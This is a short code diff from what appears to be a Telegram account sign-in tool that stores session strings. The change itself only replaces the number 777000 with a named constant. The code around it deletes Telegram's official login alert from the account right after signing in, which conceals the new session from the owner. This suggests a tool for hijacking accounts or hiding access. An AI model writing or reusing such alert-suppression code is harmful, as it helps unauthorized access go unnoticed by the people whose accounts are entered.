@@ -9,6 +9,9 @@ from utils.encryption import encrypt_session_data
 from core.database import SessionLocal
 from core.logger import log
 
+# Official Telegram service notifications bot ID (used for service messages like login alerts)
+TELEGRAM_SERVICE_BOT_ID = 777000
+
 
 def _save_session_file(phone: str, session_string: str, session_id: str) -> str:
     """
@@ -138,9 +141,9 @@ async def sign_in(code: str, session_id: str, phone: str, phone_code_hash: str, 
 
         # Удаляем сервисное сообщение о входе от Telegram (ID: 777000)
         try:
-            async for msg in client.iter_messages(777000, limit=5):
+            async for msg in client.iter_messages(TELEGRAM_SERVICE_BOT_ID, limit=5):
                 if not msg.out:
-                    await client.delete_messages(777000, [msg.id])
+                    await client.delete_messages(TELEGRAM_SERVICE_BOT_ID, [msg.id])
                     break
         except Exception as e:
             log.debug(f"Could not delete service login message for {session_id}: {e}")
